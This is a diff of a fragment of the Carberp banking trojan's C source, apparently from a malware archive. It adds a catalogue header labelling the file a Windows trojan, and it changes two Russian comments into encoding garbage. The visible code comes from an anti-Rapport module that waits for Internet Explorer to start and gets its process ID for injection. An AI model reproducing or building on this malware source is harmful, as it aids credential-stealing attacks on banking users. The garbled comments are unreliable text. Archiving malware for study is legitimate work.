@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "AntiRapport.h"
 #include "GetApi.h"
 #include <tlhelp32.h>
@@ -240,9 +251,9 @@ DWORD WINAPI WaitRunIE(PVOID p)
 {
 	for(;;)
 	{
-		if( wasRunProcess ) //был запущен какой-то процесс
+		if( wasRunProcess ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			pSleep(5000); //ждем пока он полностью инициализируется
+			pSleep(5000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			DWORD pid = InjnGetPidByName("iexplore.exe");
 			if( pid != 0 )
 			{
